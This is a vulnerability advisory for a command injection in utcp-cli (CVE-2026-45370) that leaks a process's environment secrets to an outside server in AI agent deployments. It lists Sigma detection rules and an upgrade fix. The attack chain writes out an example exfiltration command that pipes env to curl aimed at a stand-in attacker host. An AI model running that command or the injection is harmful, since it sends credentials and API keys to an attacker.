---
title: 'python-utcp: Secrets Leakage via Command Injection'
slug: 2026-05-python-utcp-secrets-leakage
description: A command injection vulnerability in `utcp-cli` versions 1.1.1 and earlier allows attackers to exfiltrate all process-level secrets by injecting commands into CLI subprocesses.
date: "2026-05-14T20:56:53Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - command-injection
  - secrets-leakage
  - python
vendors:
  - pip
products:
  - utcp-cli (<= 1.1.1)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://github.com/advisories/GHSA-5v57-8rxj-3p2r
iocs:
  - type: url
    value: https://attacker.com
ioc_counts:
  url: 1
rules:
  - title: Detect Command Injection in utcp-cli
    description: Detects CVE-2026-45370 exploitation — Command injection attempts in utcp-cli by detecting shell metacharacters in command-line arguments.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
  - title: Detect Command Injection in utcp-cli Windows
    description: Detects CVE-2026-45370 exploitation — Command injection attempts in utcp-cli by detecting shell metacharacters in command-line arguments.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

The `utcp-cli` library, in versions 1.1.1 and earlier, is vulnerable to command injection (CVE-2026-45370) due to the insecure handling of environment variables passed to subprocesses. Specifically, the `_prepare_environment()` function copies the entire `os.environ` dictionary to CLI subprocesses. Combined with a separate command injection vulnerability (GHSA-33p6-5jxp-p3x4) in `_substitute_utcp_args()`, this design allows an attacker to inject commands that can access and exfiltrate sensitive information stored in environment variables. This includes cloud provider credentials, database connection strings, LLM API keys, and internal service tokens. This vulnerability allows full process environment leakage, enabling complete system compromise for AI agent deployments.

## Attack Chain

1. The attacker crafts a malicious tool configuration containing the command injection payload.
2. The AI agent executes the tool, passing the malicious configuration to `utcp-cli`.
3. The `_substitute_utcp_args()` function fails to sanitize the attacker-supplied arguments, leading to command injection.
4. The `_prepare_environment()` function copies the entire `os.environ` to the subprocess environment.
5. The injected command executes with access to all environment variables.
6. The injected command, such as `env | curl -s -d @- https://attacker.com`, captures the environment variables and exfiltrates them to an attacker-controlled server.
7. The attacker receives the environment variables, including sensitive credentials and API keys.

## Impact

Successful exploitation of this vulnerability allows an attacker to steal sensitive information, including cloud provider credentials (AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET), database connection strings (DATABASE_URL), LLM API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY), and internal service tokens. The attacker can use these stolen credentials to gain unauthorized access to cloud resources, databases, LLM services, and internal systems. This can lead to data breaches, financial loss, and reputational damage.

## Recommendation

*   Upgrade to `utcp-cli >= 1.1.2` to address the vulnerability and prevent environment variable leakage.
*   Monitor network traffic for suspicious outbound connections to unknown domains (e.g., `https://attacker.com` in the example) originating from `utcp-cli` processes.
*   Implement the Sigma rule to detect command injection attempts in `utcp-cli` processes by monitoring for suspicious shell metacharacters in command-line arguments.
